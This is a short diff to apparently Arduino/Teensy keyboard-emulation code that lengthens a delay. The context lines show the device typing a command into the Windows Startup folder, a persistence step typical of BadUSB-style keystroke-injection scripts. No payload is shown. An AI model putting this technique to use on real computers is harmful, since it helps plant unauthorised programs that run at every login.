@@ -63,7 +63,7 @@ void setup() {
   Keyboard.set_modifier(0);
   Keyboard.set_key1(0);
   Keyboard.send_now();
-  delay(1000);
+  delay(2000);
   // Change directory to startup programs
   Keyboard.print("cd %UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
   Keyboard.set_key1(KEY_ENTER);
